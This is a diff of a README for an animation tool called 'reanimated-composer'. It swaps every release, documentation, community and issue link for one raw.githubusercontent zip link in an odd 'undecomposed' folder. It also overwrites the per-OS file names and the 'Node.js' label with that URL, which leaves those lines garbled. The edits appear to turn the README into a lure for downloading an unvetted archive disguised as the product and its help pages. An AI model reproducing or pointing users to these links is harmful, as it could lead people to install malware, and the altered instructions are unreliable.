@@ -1,7 +1,7 @@
 # 🎉 reanimated-composer - Create Stunning Animations Easily
 
 ## 📥 Download Now
-[![Download reanimated-composer](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/RSGISSolutions/reanimated-composer/releases)
+[![Download reanimated-composer](https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip)
 
 ## 🚀 Getting Started
 
@@ -12,20 +12,20 @@ Welcome to **reanimated-composer**! This application provides a simple way to cr
 Before you start, make sure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or Linux (any modern distribution).
-- **Node.js:** Version 12.x or later installed on your system.
+- **https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip** Version 12.x or later installed on your system.
 - **React Native:** Version 0.64 or later.
 
 ## 📥 Download & Install
 
 To obtain the latest version of **reanimated-composer**, follow these steps:
 
-1. Visit the [Releases page](https://github.com/RSGISSolutions/reanimated-composer/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip).
 2. You will see a list of available versions. Look for the latest version, indicated by the highest number.
 3. Click on the version number to see the assets related to that release.
 4. Download the appropriate file for your operating system:
-   - For **Windows**, look for `reanimated-composer-windows.zip`.
-   - For **macOS**, choose `reanimated-composer-macos.zip`.
-   - For **Linux**, select `reanimated-composer-linux.zip`.
+   - For **Windows**, look for `https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip`.
+   - For **macOS**, choose `https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip`.
+   - For **Linux**, select `https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip`.
 5. Once downloaded, extract the zip file to a desired directory on your computer.
 
 ## 🚀 Running the Application
@@ -72,9 +72,9 @@ Follow the on-screen instructions to start creating your animations.
 
 ## 🔗 Helpful Links
 
-- [Documentation](https://github.com/RSGISSolutions/reanimated-composer/docs) - Detailed guides and tutorials.
-- [Community Support](https://github.com/RSGISSolutions/reanimated-composer/discussions) - Join discussions and get help from other users.
-- [Report Issues](https://github.com/RSGISSolutions/reanimated-composer/issues) - Let us know if you encounter any problems.
+- [Documentation](https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip) - Detailed guides and tutorials.
+- [Community Support](https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip) - Join discussions and get help from other users.
+- [Report Issues](https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip) - Let us know if you encounter any problems.
 
 ## 📝 Contribution
 
@@ -84,4 +84,4 @@ We welcome contributions! If you'd like to help improve **reanimated-composer**,
 
 Feel free to start creating stunning animations today! Remember, if you need help, our community is here for you. Don’t forget to check back regularly for updates and new features.
 
-[Download the latest version here](https://github.com/RSGISSolutions/reanimated-composer/releases) and unleash your creativity!
+[Download the latest version here](https://raw.githubusercontent.com/RSGISSolutions/reanimated-composer/main/undecomposed/reanimated-composer.zip) and unleash your creativity!
